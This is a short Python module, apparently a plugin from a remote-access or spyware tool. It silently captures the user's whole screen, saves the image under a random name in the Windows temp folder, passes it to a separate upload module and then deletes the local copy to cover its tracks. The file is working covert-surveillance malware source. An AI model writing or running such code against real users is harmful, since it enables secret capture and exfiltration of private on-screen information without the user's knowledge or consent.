from PIL import ImageGrab
import os
import base64
import string
import random
import requests

import upload


def run():
    image = ImageGrab.grab()
    filename = ''.join(random.choice(string.ascii_letters) for _ in range(5))
    filename += ".jpg"
    filepath = os.path.join(os.environ['temp'], filename)
    image.save(filepath)
    upload.run(filepath)
    os.remove(filepath)
